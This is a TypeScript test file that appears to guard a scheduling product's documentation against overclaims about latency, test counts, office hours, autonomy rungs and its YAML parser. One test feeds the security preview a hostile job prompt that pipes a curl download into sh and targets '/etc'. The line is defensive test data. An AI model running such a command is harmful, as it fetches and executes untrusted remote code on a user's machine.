/**
 * Tripwires for the claims this repo makes about itself.
 *
 * The product's argument is "check it rather than believe it", so a sentence
 * that overstates is a bug with the same standing as a wrong return value.
 * These tests read the shipped prose and the shipped source and refuse the
 * specific overstatements an adversarial review proved false:
 *
 *   1. a wall-clock bound asserted inside the default test command
 *  1b. a latency FIGURE reported as a verdict, when the same command on the
 *      same laptop returns both verdicts depending on machine load
 *   2. a "686 passed, 0 failed" claim that does not reproduce
 *   3. office hours described as the "exact same mechanism" as quiet hours
 *   4. office hours documented as two setup steps when it has three
 *   5. an autonomy ladder whose top two rungs are described as distinct
 *   6. a test-count table whose rows do not add up to its own total
 *   7. a load-bearing file cited by path that git does not track
 *   8. a registry comment implying `resolve()` re-enables the execute task,
 *      and the same comment restated as a product-wide absolute that a
 *      reachable route falsifies
 *   9. an import refusal advertised on a red flag no discovery can produce
 *  10. a restricted YAML parser documented as stricter than it is
 *  11. two shipped approval cards missing from the feature they belong to
 *  12. an autonomy gate docstring claiming a call site it does not have
 *  13. a present, reachable gap written up in an ADR as hypothetical
 *
 * Same idiom as `feature-honesty.test.ts` / `landing-honesty.test.ts`: read
 * the artifact, assert against it, name the offender in the failure message.
 */
import { describe, it, expect } from 'vitest';
import { execFileSync } from 'node:child_process';
import { existsSync, readdirSync, readFileSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { AUTONOMY_RUNG_SETTINGS } from '@clockwork/shared';
import { parseJobsFile } from '../src/repo-jobs.js';
import { securityPreview } from '../src/templates.js';
import { assertLatency, latencyAssertionsEnabled, LATENCY_ASSERT_ENV } from './helpers/bench-gate.js';

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(HERE, '../../..');
const read = (rel: string): string => readFileSync(resolve(ROOT, rel), 'utf8');

const BENCH = 'packages/daemon/test/workforce-bench.test.ts';
const STATUS = 'plan/STATUS.md';
const WORKFORCE_DOC = 'docs/agent-workforce.md';
const SCHEDULING_DOC = 'docs/scheduling.md';
const DECISIONS = 'decisions/DECISIONS.md';
const FEATURES = 'packages/daemon/src/features.ts';
const SCHEDULER = 'packages/daemon/src/scheduler.ts';
const SCALABILITY = 'docs/architecture/scalability.md';
const BENCH_GATE = 'packages/daemon/test/helpers/bench-gate.ts';

/** The twelve feature-module suites the STATUS table names on one row. */
const FEATURE_SUITES = [
  'plan-execute', 'handoff', 'office-hours', 'sentinel', 'repo-jobs', 'acceptance',
  'autonomy-policy', 'self-healing', 'proposed-events', 'timesheets', 'performance', 'proof-of-work',
];

/** Every `.ts`/`.tsx` file under `packages/ * /src`, ignoring build output. */
function sourceFiles(dir: string, out: string[] = []): string[] {
  for (const e of readdirSync(dir, { withFileTypes: true })) {
    const p = resolve(dir, e.name);
    if (e.isDirectory()) {
      if (e.name === 'node_modules' || e.name === 'dist' || e.name === 'test') continue;
      sourceFiles(p, out);
    } else if (/\.tsx?$/.test(e.name)) {
      out.push(p);
    }
  }
  return out;
}

/** Markdown section between one heading and the next of the same-or-higher level. */
function section(src: string, heading: RegExp): string {
  const lines = src.split('\n');
  const start = lines.findIndex((l) => heading.test(l));
  expect(start, `heading ${heading} not found`).toBeGreaterThan(-1);
  const level = (lines[start]!.match(/^#+/) ?? ['##'])[0].length;
  for (let i = start + 1; i < lines.length; i++) {
    const m = lines[i]!.match(/^(#+)\s/);
    if (m && m[1]!.length <= level) return lines.slice(start, i).join('\n');
  }
  return lines.slice(start).join('\n');
}

// ---------------------------------------------------------------------------
// 1. The bench gate — a latency bound must never turn the default suite red.
// ---------------------------------------------------------------------------
describe('the benchmark measures by default and asserts only on request', () => {
  it('has no ungated wall-clock assertion left in the bench file', () => {
    const src = read(BENCH);
    // Every bound goes through assertLatency(), which is a no-op assertion
    // unless CLOCKWORK_BENCH_ASSERT=1. A bare toBeLessThan on a measured
    // duration is exactly the defect: the suite's colour becomes a property
    // of the machine it ran on.
    const bare = [...src.matchAll(/^.*\.toBeLessThan\(.*$/gm)].map((m) => m[0].trim());
    expect(bare, `ungated latency bound(s) in ${BENCH}:\n${bare.join('\n')}`).toEqual([]);
  });

  it('routes every measured bound through the gate and says so in its header', () => {
    const src = read(BENCH);
    expect(src).toContain("from './helpers/bench-gate.js'");
    // 21 bounds were gated when this landed (T-113 x8 + indexRun x1,
    // T-307 x5, F10/F11 x4, S-9 x3). Fewer means one was dropped, not gated.
    expect([...src.matchAll(/assertLatency\(/g)].length).toBeGreaterThanOrEqual(21);
    const header = src.slice(0, src.indexOf('*/'));
    expect(header).toContain(LATENCY_ASSERT_ENV);
    expect(header.toLowerCase()).toContain('not asserted');
  });

  it('leaves the correctness assertions unconditional', () => {
    const src = read(BENCH);
    // If these ever get gated too, the bench stops proving the corpus is real
    // and a fast query over an empty table would look like a pass.
    expect(src).toContain('expect(runs).toBe(RUN_COUNT)');
    expect(src).toContain('expect(matched).toBeGreaterThan(4_000)');
    expect(src).toContain('expect(body.runs.length).toBe(RUN_COUNT)');
    expect(src).toContain("expect(body.runs[0]).not.toHaveProperty('jobspec_json')");
  });
});

describe('bench-gate', () => {
  it('is off unless the caller opts in explicitly', () => {
    expect(latencyAssertionsEnabled({})).toBe(false);
    expect(latencyAssertionsEnabled({ [LATENCY_ASSERT_ENV]: '' })).toBe(false);
    expect(latencyAssertionsEnabled({ [LATENCY_ASSERT_ENV]: '0' })).toBe(false);
    expect(latencyAssertionsEnabled({ [LATENCY_ASSERT_ENV]: 'yes' })).toBe(false);
    expect(latencyAssertionsEnabled({ [LATENCY_ASSERT_ENV]: '1' })).toBe(true);
    expect(latencyAssertionsEnabled({ [LATENCY_ASSERT_ENV]: 'true' })).toBe(true);
  });

  it('reports an exceeded bound without failing when the gate is off', () => {
    const before = process.env[LATENCY_ASSERT_ENV];
    delete process.env[LATENCY_ASSERT_ENV];
    try {
      expect(assertLatency('probe', 9_999, 500)).toBe(false); // reported, not thrown
      expect(assertLatency('probe', 1, 500)).toBe(true);
    } finally {
      if (before !== undefined) process.env[LATENCY_ASSERT_ENV] = before;
    }
  });

  it('fails an exceeded bound when the gate is on', () => {
    const before = process.env[LATENCY_ASSERT_ENV];
    process.env[LATENCY_ASSERT_ENV] = '1';
    try {
      expect(() => assertLatency('probe', 9_999, 500)).toThrow(/probe/);
      expect(assertLatency('probe', 1, 500)).toBe(true);
    } finally {
      if (before === undefined) delete process.env[LATENCY_ASSERT_ENV];
      else process.env[LATENCY_ASSERT_ENV] = before;
    }
  });
});

// ---------------------------------------------------------------------------
// 1b. Gating the assertion is only half the fix. The NUMBER is a claim too,
//     and a number that moves this much may not be reported as a verdict.
//
//     Ten runs on 2026-09-06, one Apple M4 (10 cores, 16GB, Node v24.13.1),
//     one commit, inside 90 minutes. Six of them were
//     `CLOCKWORK_BENCH_ASSERT=1 npx vitest run test/workforce-bench.test.ts`:
//     at `uptime` load 12.5-27.1 the S-64 year-view median came in at
//     623.17 / 684.26 / 579.59ms and all three runs went RED (1, 2 and 2
//     failed assertions of 16); at load 7.4-7.9 the same command measured
//     383.93 / 376.56 / 349.59ms and all three went GREEN (16 of 16). The four
//     full-suite runs bracket the same way: 670.53ms busy, then 368.80 /
//     368.11 / 375.31ms quiet.
//
//     So NFR-3's 500ms median claim held in six of the ten runs and missed in
//     the other four, decided by machine load rather than by code. That is
//     the finding, and the prose has to carry it: no fixed headroom figure can
//     be read off a number that ranged 349.59-684.26ms, and no document may
//     report only the runs that cleared the bound.
// ---------------------------------------------------------------------------
describe('the latency record reports both verdicts, not the flattering one', () => {
  /** The passage each document devotes to the T-307 calendar measurement. */
  const T307_RECORD: ReadonlyArray<readonly [string, () => string]> = [
    [STATUS, () => read(STATUS).split('\n').find((l) => l.startsWith('| T-307 |')) ?? ''],
    [SCALABILITY, () => section(read(SCALABILITY), /^## The one latent item/)],
    [WORKFORCE_DOC, () => section(read(WORKFORCE_DOC), /^## Performance note \(T-307 bench/)],
  ];

  it('calls no wall-clock result hardware-independent', () => {
    // Nothing measured here is. T-113's common-term case is the steadiest
    // number in the bench and it still ran 3.24ms alone and 27.58ms inside a
    // loaded full suite — an 8x swing on one machine, one commit.
    for (const f of [STATUS, SCALABILITY, WORKFORCE_DOC, BENCH, BENCH_GATE]) {
      expect(read(f), `${f} calls a measured latency hardware-independent`).not.toMatch(
        /hardware[- ]independent/i,
      );
    }
  });

  for (const [label, extract] of T307_RECORD) {
    it(`${label} names the load dependence and keeps the runs that missed the bound`, () => {
      const s = extract();
      expect(s, `no T-307 record found in ${label}`).not.toBe('');
      expect(s, `${label} reads a fixed headroom off a number that ranged 349.59-684.26ms`).not.toMatch(
        /clears the 500 ?ms|1\.2\s*[–-]\s*1\.3\s*[x×]|[\d.]+\s*[x×]\s*headroom/i,
      );
      expect(s, `${label} does not name what actually decides the verdict`).toMatch(
        /machine load|load average/i,
      );
      expect(s, `${label} reports no run that missed the 500ms ceiling`).toMatch(
        /(over|above) the (500 ?ms )?ceiling|(over|above) the 500|exceeded/i,
      );
    });
  }
});

// ---------------------------------------------------------------------------
// 2 + 6. The test inventory: no unreproducible pass claim, and rows that add up.
// ---------------------------------------------------------------------------
describe('the test inventory reports what a re-run actually produces', () => {
  const inventory = (): string => section(read(STATUS), /^## Test inventory vs mandate/);

  it('makes no "686 passed, 0 failed" claim anywhere in the repo prose', () => {
    for (const f of [STATUS, WORKFORCE_DOC, 'README.md', DECISIONS]) {
      expect(read(f), `${f} still claims a test total that does not reproduce`).not.toMatch(
        /686 passed|685 passed|\b686\b tests/,
      );
    }
  });

  it('discloses that the bench does not assert its bounds by default', () => {
    const inv = inventory();
    expect(inv).toContain(LATENCY_ASSERT_ENV);
  });

  it('counts the twelve feature-module suites correctly', () => {
    // Static counting is exact for these twelve: none of them generates tests
    // in a loop or through .each, which the next assertion pins.
    let total = 0;
    for (const s of FEATURE_SUITES) {
      const src = read(`packages/daemon/test/${s}.test.ts`);
      expect(src, `${s}.test.ts generates tests dynamically; the static count below is no longer exact`).not.toMatch(
        /\b(it|test|describe)\.each\b/,
      );
      total += [...src.matchAll(/^\s*(?:it|test)\(/gm)].length;
    }
    const row = inventory()
      .split('\n')
      .find((l) => l.includes('F1–F12') || l.includes('F1-F12'));
    expect(row, 'no feature-module row in the STATUS test inventory').toBeTruthy();
    const claimed = Number(row!.split('|')[2]!.replace(/\D/g, ''));
    expect(claimed, `STATUS claims ${claimed} feature-module tests; the twelve files hold ${total}`).toBe(total);
  });

  it('has rows that add up to its own stated total', () => {
    const rows = inventory()
      .split('\n')
      .filter((l) => l.startsWith('|') && !l.startsWith('|---'));
    let sum = 0;
    let stated: number | null = null;
    for (const r of rows) {
      const cell = r.split('|')[2]?.trim() ?? '';
      if (/^\d+$/.test(cell)) sum += Number(cell);
      else if (/passed/.test(cell)) stated = Number(cell.replace(/\*/g, '').match(/^(\d+)/)?.[1] ?? '0');
    }
    expect(stated, 'no total row found in the STATUS test inventory').not.toBeNull();
    expect(sum, `inventory rows sum to ${sum} but the table claims ${stated}`).toBe(stated);
  });
});

// ---------------------------------------------------------------------------
// 3. Office hours is NOT the quiet-hours mechanism. The code says so on purpose.
// ---------------------------------------------------------------------------
describe('office hours is described as the code implements it', () => {
  it('the code really does differ from quiet hours in both halves', () => {
    // Ground the doc claim in the source, so a future scheduler change that
    // made the two identical would fail here rather than silently make the
    // corrected prose wrong again.
    const src = read(SCHEDULER);
    // Comments out: the office-hours branch explains in prose exactly why it
    // does NOT do the thing the words "INSERT OR IGNORE" would otherwise match.
    const code = (s: string): string => s.replace(/^\s*\/\/.*$/gm, '');
    const quiet = code(src.slice(src.indexOf('if (qh && inQuietWindow'), src.indexOf('// Office hours (F3')));
    const office = code(
      src.slice(src.indexOf('const officeShift = shiftForApproval'), src.indexOf('this.enqueue(task, sched, fireAt, now, false, 0);')),
    );
    // The SQL is written with escaped quotes in the source, so match loosely.
    const ONCE_GUARD = /kind\s*!=\s*\\?'once\\?'/;
    expect(quiet).toContain('INSERT OR IGNORE INTO schedule_occurrences');
    expect(quiet).toMatch(ONCE_GUARD);
    expect(office, 'office hours now pre-claims a ledger row; the docs say it does not').not.toContain('INSERT OR IGNORE');
    expect(office, "office hours now skips 'once' schedules; the docs say it bumps every kind").not.toMatch(ONCE_GUARD);
  });

  for (const [label, file, heading] of [
    ['docs/scheduling.md', SCHEDULING_DOC, /^## Office hours \(F3/],
    ['docs/agent-workforce.md', WORKFORCE_DOC, /^## F3 — Office hours/],
    ['ADR-038', DECISIONS, /^## ADR-038/],
  ] as const) {
    it(`${label} does not claim office hours uses the quiet-hours mechanism`, () => {
      const s = section(read(file), heading);
      expect(s, `${label} still claims the "exact same mechanism" as quiet hours`).not.toMatch(/exact same mechanism/i);
      expect(s, `${label} still claims office hours pre-claims a ledger row`).not.toMatch(/INSERT OR IGNORE/i);
    });

    it(`${label} states the two deliberate differences and why`, () => {
      const s = section(read(file), heading);
      expect(s, `${label} does not say office hours declines to pre-claim`).toMatch(/does not pre-claim|deliberately does not/i);
      expect(s, `${label} does not say every schedule kind is bumped, one-shots included`).toMatch(
        /`once` included|including `once`|every (schedule )?kind/i,
      );
      expect(s, `${label} does not explain why the one-shot has to be bumped`).toMatch(/one-shot|lost work/i);
    });
  }
});

// ---------------------------------------------------------------------------
// 4. Office hours has a third, mandatory setup step.
// ---------------------------------------------------------------------------
describe('office hours documents all three of its setup steps', () => {
  it('only the autonomy module ever writes the flag office hours reads', () => {
    // If a route ever sets may_require_approval directly, the "third step is
    // an autonomy enrolment" sentence in the docs stops being true.
    const writers = sourceFiles(resolve(ROOT, 'packages'))
      .filter((f) => /UPDATE profiles SET[^`']*may_require_approval\s*=/.test(readFileSync(f, 'utf8')))
      .map((f) => f.slice(ROOT.length + 1))
      .sort();
    expect(writers, 'a new writer of may_require_approval bypasses autonomy enrolment').toEqual([
      'packages/daemon/src/autonomy-policy.ts',
    ]);
    expect(read('packages/daemon/src/office-hours.ts')).toContain('p.may_require_approval AS v');
  });

  for (const [label, file, heading] of [
    ['docs/scheduling.md', SCHEDULING_DOC, /^## Office hours \(F3/],
    ['docs/agent-workforce.md', WORKFORCE_DOC, /^## F3 — Office hours/],
  ] as const) {
    it(`${label} says the flag is only reachable through autonomy enrolment`, () => {
      const s = section(read(file), heading);
      expect(s).toMatch(/may_require_approval/);
      expect(s, `${label} does not tell the reader how to set the flag`).toMatch(
        /autonomy\/profiles\/:?\w*\/enroll|autonomy.*enroll/i,
      );
      expect(s, `${label} does not say that no profile route sets the flag`).toMatch(/\bno\s+(profile\s+)?route\b/i);
    });
  }

  it('ADR-038 records the enrolment dependency as a consequence', () => {
    const s = section(read(DECISIONS), /^## ADR-038/);
    expect(s).toMatch(/may_require_approval/);
    expect(s).toMatch(/enrol/i);
  });
});

// ---------------------------------------------------------------------------
// 5. The autonomy ladder's top two rungs are identical in permission.
// ---------------------------------------------------------------------------
describe('the autonomy ladder is described as one enforced rung plus one advisory step', () => {
  it('the two top rungs really are the same permission mode', () => {
    expect(AUTONOMY_RUNG_SETTINGS.acceptEdits.permissionMode).toBe(AUTONOMY_RUNG_SETTINGS.unattended.permissionMode);
    expect(AUTONOMY_RUNG_SETTINGS.acceptEdits.mayRequireApproval).not.toBe(
      AUTONOMY_RUNG_SETTINGS.unattended.mayRequireApproval,
    );
    // The gate fires on exactly one rung.
    const src = read('packages/daemon/src/autonomy-policy.ts');
    expect(src).toContain("if (allowed === 'plan' && input.permissionMode !== 'plan')");
  });

  it('docs/agent-workforce.md says which rung refuses anything and which does not', () => {
    const s = section(read(WORKFORCE_DOC), /^## F7 — Earned autonomy/);
    expect(s, 'F7 does not say that only the plan rung refuses a task').toMatch(/only the .?plan.? rung/i);
    expect(s, 'F7 does not disclose that the top two rungs share a permission mode').toMatch(
      /same permission mode|both .*acceptEdits/i,
    );
    expect(s, 'F7 does not name the sole consumer of the approval flag').toMatch(/office hours/i);
  });

  it('ADR-037 records the same limit', () => {
    const s = section(read(DECISIONS), /^## ADR-037/);
    expect(s).toMatch(/only the .?plan.? rung|one enforced rung/i);
  });

  it('docs/agent-workforce.md no longer claims a profile keeps the mode you set', () => {
    const s = section(read(WORKFORCE_DOC), /^## F7 — Earned autonomy/);
    expect(s, 'F7 still claims enrolment leaves permission_mode alone').not.toMatch(
      /A profile starts at whatever permission mode you set\./,
    );
    expect(s, 'F7 does not disclose that enrolling overwrites permission_mode').toMatch(/overwrit/i);
  });
});

// ---------------------------------------------------------------------------
// 7. Every path the prose cites exists, and the load-bearing ones are tracked.
// ---------------------------------------------------------------------------
describe('cited paths', () => {
  const CITING = [
    'README.md', STATUS, WORKFORCE_DOC, SCHEDULING_DOC, 'docs/security.md',
    'docs/architecture/scalability.md', DECISIONS,
  ];

  it('every repo path the prose cites exists on disk', () => {
    const missing: string[] = [];
    for (const f of CITING) {
      for (const m of read(f).matchAll(/`([^`\n]+)`/g)) {
        let p = m[1]!.trim();
        if (!/^(packages|docs|plan|decisions|spikes|dogfood|designs|landing-page|packaging|worker)\//.test(p)) continue;
        if (p.includes('*') || p.includes('{') || p.includes(' ')) continue; // globs and prose, not paths
        p = p.replace(/:\d+(?:[-,]\d+)*$/, ''); // strip a line reference, incl. "file.ts:14,19,270"
        if (!existsSync(resolve(ROOT, p))) missing.push(`${f} cites ${p}`);
      }
    }
    expect(missing, missing.join('\n')).toEqual([]);
  });

  it('git tracks the files the prose treats as load-bearing', () => {
    // Untracked means "does not exist for anyone who clones this repo", which
    // is worse than a broken link: ApprovalCard.tsx is imported by InboxView.
    const loadBearing = [WORKFORCE_DOC, BENCH, 'packages/ui/src/components/ApprovalCard.tsx'];
    const tracked = execFileSync('git', ['ls-files', '--', ...loadBearing], { cwd: ROOT, encoding: 'utf8' })
      .split('\n')
      .filter(Boolean);
    expect(loadBearing.filter((p) => !tracked.includes(p)), 'untracked but cited by path').toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 8. The registry comment about F1.
// ---------------------------------------------------------------------------
describe('the capability registry comment matches the invariant it describes', () => {
  it('does not read as though resolve() re-enables the execute task', () => {
    const src = read(FEATURES);
    expect(src, "features.ts still says the execute task stays disabled 'until resolve()'").not.toContain(
      'until resolve()',
    );
    expect(src, 'features.ts does not state the actual F1 invariant').toMatch(
      /never re-enabled|stays enabled=0 permanently/i,
    );
  });

  // Retitled: this greps ONE function body, so it proves one thing about
  // plan-execute.ts's resolve() and nothing about the product. The old title
  // ("the code it describes really never re-enables the task") is exactly the
  // overclaim this file exists to catch — a tripwire that overstates its own
  // coverage is the same defect as a doc that overstates the product. The
  // product-wide half is the next test.
  it("resolve() in plan-execute.ts never writes enabled=1", () => {
    const src = read('packages/daemon/src/plan-execute.ts');
    const resolveBody = src.slice(src.indexOf('  resolve('));
    expect(resolveBody).not.toMatch(/UPDATE tasks SET[^;]*enabled\s*=\s*1/);
  });

  it('scopes the "never re-enabled" claim to F1 and names what can flip the flag today', () => {
    // An unscoped absolute here is false: PATCH /tasks/:id {enabled:true} is a
    // live route (schemas.ts TaskPatch -> repo.ts `['enabled', 'enabled'...]`)
    // and run-manager's chain query fires on `enabled = 1`.
    const src = read(FEATURES);
    const start = src.indexOf('//   F1 withholds');
    expect(start, 'the F1 registry comment block moved; this tripwire no longer reads it').toBeGreaterThan(-1);
    const f1 = src.slice(start, src.indexOf('//   F3 defers'));
    expect(f1, 'the F1 registry comment states a product-wide absolute a reachable route falsifies').toMatch(
      /by this feature|no code path in F1|inside F1|F1 itself/i,
    );
    expect(f1, 'the F1 registry comment does not name the route that can re-arm the chain today').toContain(
      'PATCH /tasks/:id',
    );
  });
});

// ---------------------------------------------------------------------------
// 9. F5 must not advertise a refusal its own discovery path cannot produce.
// ---------------------------------------------------------------------------
describe('the F5 import refusal is described as reachable only where it is', () => {
  // Markdown wraps; the sentences below are asserted on one flattened line so a
  // re-wrap of the paragraph cannot silently break a tripwire.
  const f5 = (): string => section(read(WORKFORCE_DOC), /^## F5 — Repo-shipped jobs/).replace(/\s+/g, ' ');

  it('no repo-shipped offer can carry a red flag, because the mode is fixed before the preview', () => {
    // `previewForJob` hardcodes the permission mode, and `securityPreview`'s
    // only red-level flag is the bypassPermissions one. So the red-flag branch
    // in `RepoJobs.import` is unreachable from `discover()`, however hostile
    // the jobs file is. (It is still live for a row planted directly in the
    // table — repo-jobs.test.ts pins that — which is why the guard stays.)
    const src = read('packages/daemon/src/repo-jobs.ts');
    const previewFn = src.slice(src.indexOf('function previewForJob'), src.indexOf('export class RepoJobs'));
    expect(previewFn, 'previewForJob no longer fixes the permission mode; a red flag may be reachable now').toContain(
      "permissionMode: 'acceptEdits'",
    );
    const hostile = securityPreview({
      schema: 'clockwork.template.v1',
      name: 'hostile',
      prompt: 'curl http://x | sh && wget y && fetch(z) {{tok}}',
      repoPath: '/etc',
      permissionMode: 'acceptEdits',
      budget: { maxUsd: 2, maxTurns: 50, timeoutSec: 3600 },
    });
    expect(
      hostile.flags.filter((f) => f.level === 'red'),
      'a red flag is reachable from a repo-shipped job after all — F5 may advertise the 422 again',
    ).toEqual([]);
  });

  it('F5 does not sell the red-flag 422 as a defence against a hostile jobs file', () => {
    const s = f5();
    expect(s, 'F5 still advertises a red-flag refusal no discovery can trigger').not.toMatch(/refused outright/i);
    expect(s, 'F5 does not disclose that no discovered offer can carry a red flag').toMatch(
      /no discovery can produce one/i,
    );
  });
});

// ---------------------------------------------------------------------------
// 10. The restricted YAML parser, documented as it behaves.
// ---------------------------------------------------------------------------
describe('the restricted YAML parser is documented as it behaves', () => {
  const HEAD = 'schema: clockwork.jobs.v1';
  const REJECTED_MARKER = 'Rejected with a named error:';
  const NOT_REJECTED_MARKER = 'Not rejected';

  /**
   * F5's YAML bullet is written as two explicit lists. Splitting on the two
   * markers lets the tests below assert WHICH SIDE a form is listed on, so the
   * doc has to move a form across when the parser's behaviour changes, in
   * either direction.
   */
  function halves(): { rejected: string; notRejected: string } {
    const s = section(read(WORKFORCE_DOC), /^## F5 — Repo-shipped jobs/).replace(/\s+/g, ' ');
    const i = s.indexOf(REJECTED_MARKER);
    const j = s.indexOf(NOT_REJECTED_MARKER);
    expect(i, `F5 has no "${REJECTED_MARKER}" list`).toBeGreaterThan(-1);
    expect(j, `F5 has no "${NOT_REJECTED_MARKER}" list after the rejected one`).toBeGreaterThan(i);
    return { rejected: s.slice(i, j), notRejected: s.slice(j) };
  }

  it('every form F5 lists as a named rejection really is one', () => {
    const NAMED: ReadonlyArray<readonly [string, string, RegExp]> = [
      ['anchors', [HEAD, 'jobs:', '  - key: k', '    name: &a N', '    prompt: P'].join('\n'), /anchor/],
      ['aliases', [HEAD, 'jobs:', '  - key: k', '    name: *a', '    prompt: P'].join('\n'), /alias/],
      ['block scalars', [HEAD, 'jobs:', '  - key: k', '    name: N', '    prompt: |', '      x'].join('\n'), /block scalar/],
      ['flow collections', [HEAD, 'jobs: [1]'].join('\n'), /flow collection/],
      [
        'nested sequences',
        [HEAD, 'jobs:', '  - key: k', '    name: N', '    prompt: P', '    files:', '      - - a'].join('\n'),
        /nested sequence/,
      ],
      ['tab indentation', [HEAD, 'jobs:', '\t- key: k'].join('\n'), /tab/],
      ['duplicate keys', [HEAD, 'jobs:', 'jobs:'].join('\n'), /duplicate key/],
    ];
    const { rejected } = halves();
    for (const [label, text, named] of NAMED) {
      const r = parseJobsFile(text, 'yaml');
      expect('error' in r, `F5 lists ${label} as rejected, but the parser accepted it`).toBe(true);
      expect((r as { error: string }).error, `${label}: rejected, but not under the name F5 gives it`).toMatch(named);
      expect(rejected, `F5's rejected list no longer names ${label}`).toMatch(new RegExp(label.split(' ')[0]!, 'i'));
    }
  });

  it('lists multi-document files on the side the parser actually puts them on', () => {
    // A `---` SEPARATOR in a file whose first document carries no leading
    // marker. preprocess() consumes the first marker it sees wherever it sits,
    // so today this merges the two documents instead of refusing them.
    const twoDocs = [HEAD, 'jobs:', '  - key: a', '    name: A', '    prompt: P', '---', 'extra: x'].join('\n');
    const r = parseJobsFile(twoDocs, 'yaml');
    const named = 'error' in r && /multi-document/.test(r.error);
    const { rejected, notRejected } = halves();
    expect(
      named ? rejected : notRejected,
      `the parser ${named ? 'names' : 'does not name'} a multi-document error for a file with no leading marker; F5 lists it on the other side`,
    ).toMatch(/multi-document/i);
    expect(named ? notRejected : rejected, 'F5 lists multi-document files on both sides at once').not.toMatch(
      /multi-document/i,
    );
    // One list, one place. repo-jobs.ts's module header used to carry its own
    // copy of the grammar and got two of five forms wrong; it points here now.
    expect(
      read('packages/daemon/src/repo-jobs.ts'),
      'repo-jobs.ts no longer points at F5 as the authoritative list; a second copy of the grammar can drift',
    ).toContain('`docs/agent-workforce.md` §F5');
  });

  it('lists nesting depth on the side the parser actually puts it on', () => {
    // Mapping recursion has no bound today, so 500 levels parse fine and the
    // only complaint comes from the schema, not the parser.
    let deep = `${HEAD}\n`;
    for (let i = 0; i < 500; i++) deep += `${' '.repeat(i)}k${i}:\n`;
    const r = parseJobsFile(deep, 'yaml');
    const named = 'error' in r && /depth|too deep|nesting/i.test(r.error);
    const { rejected, notRejected } = halves();
    expect(
      named ? rejected : notRejected,
      `the parser ${named ? 'bounds' : 'does not bound'} mapping nesting depth; F5 lists depth on the other side`,
    ).toMatch(/depth/i);
    expect(named ? notRejected : rejected, 'F5 lists nesting depth on both sides at once').not.toMatch(/depth/i);
  });
});

// ---------------------------------------------------------------------------
// 11. Two approval cards shipped; the features they belong to have to say so.
// ---------------------------------------------------------------------------
describe('the workforce doc names the UI that shipped', () => {
  it('F1 and F8 name the inbox card their approval rows render in', () => {
    const doc = read(WORKFORCE_DOC);
    for (const [label, heading, body] of [
      ['F1', /^## F1 — Plan-then-execute/, 'PlanBody'],
      ['F8', /^## F8 — Self-healing/, 'RemediationBody'],
    ] as const) {
      const s = section(doc, heading);
      expect(s, `${label} does not mention the approval card that ships for it`).toContain('ApprovalCard');
      expect(s, `${label} does not name the part of the card that renders its decision`).toContain(body);
    }
    // Both halves exist and are mounted — otherwise the doc would be citing UI
    // that is not there, which is the same defect pointing the other way.
    const card = read('packages/ui/src/components/ApprovalCard.tsx');
    expect(card).toContain('function PlanBody');
    expect(card).toContain('function RemediationBody');
    expect(read('packages/ui/src/components/InboxView.tsx')).toContain('<ApprovalCard');
  });
});

// ---------------------------------------------------------------------------
// 12. The autonomy gate's docstring names call sites it actually has.
// ---------------------------------------------------------------------------
describe('the autonomy gate is documented at the call sites it really has', () => {
  const AUTONOMY = 'packages/daemon/src/autonomy-policy.ts';

  it('does not claim the gate runs at enqueue time', () => {
    const src = read(AUTONOMY);
    expect(src, 'autonomy-policy.ts still claims the gate is evaluated at enqueue time').not.toMatch(
      /at enqueue time/i,
    );
    expect(src, 'autonomy-policy.ts does not name run-now, which enqueues without consulting it').toMatch(/run-now/);
  });

  it('and api.ts really consults it at exactly the three sites the docstring names', () => {
    const api = read('packages/daemon/src/api.ts');
    // `evaluateEdit` is the same ceiling applied to a PATCH, so it counts as a
    // call site of the gate; the docstring names all three together.
    expect(
      [...api.matchAll(/autonomy\.evaluate(?:Edit)?\(/g)],
      'the number of autonomy gate call sites in api.ts changed; update the autonomy-policy.ts docstring',
    ).toHaveLength(3);
    expect(
      [...sourceFiles(resolve(ROOT, 'packages')).filter((f) => /from '\.\/autonomy-policy\.js'/.test(readFileSync(f, 'utf8')))],
      'a second module imports the autonomy gate; the docstring says api.ts is the only one',
    ).toHaveLength(1);
    const from = api.indexOf("app.post('/tasks/:id/run-now'");
    expect(from, 'the run-now route moved; this tripwire no longer reads it').toBeGreaterThan(-1);
    const handler = api.slice(from, api.indexOf('\n  });', from));
    expect(handler, 'run-now now consults the autonomy gate; the docstring says it does not').not.toContain(
      'autonomy.evaluate',
    );
  });
});

// ---------------------------------------------------------------------------
// 13. ADR-041 writes up a present route, not a hypothetical future feature.
// ---------------------------------------------------------------------------
describe('ADR-041 records the enabled-flag hazard as the live route it is', () => {
  it('names the shipped route and what closed it, not only a future hazard', () => {
    // The forward-looking rule ("any future feature that flips `enabled`...")
    // is sound on its own terms. What was wrong was that it was ALL the ADR
    // said, while a shipped route already did exactly that. So assert the
    // substance rather than banning the phrase: the ADR has to name the route,
    // say it was already reachable, and say what refuses it now.
    const s = section(read(DECISIONS), /^## ADR-041/);
    expect(s, 'ADR-041 does not name the route that could flip `enabled` on an execute half').toContain(
      'PATCH /tasks/:id',
    );
    expect(
      s,
      'ADR-041 presents the enabled-flag hazard as future-only; a shipped route already reintroduced it',
    ).toMatch(/already shipped|was already|already reintroduced|reachable today/i);
    expect(s, 'ADR-041 does not say what refuses that route now').toMatch(/planExecuteGate|\b409\b/);
  });

  it('and that route really can re-arm a chain the run manager fires', () => {
    expect(read('packages/daemon/src/repo.ts'), 'TaskRepo.patch no longer maps the `enabled` column').toMatch(
      /\['enabled', 'enabled'/,
    );
    expect(read('packages/daemon/src/run-manager.ts'), 'the chain query no longer selects on enabled = 1').toContain(
      'chain_after = ? AND deleted_at IS NULL AND enabled = 1',
    );
    expect(read('packages/daemon/src/plan-execute.ts'), 'the execute half no longer carries chain_after').toContain(
      'chainAfter: planRow.id',
    );
  });
});
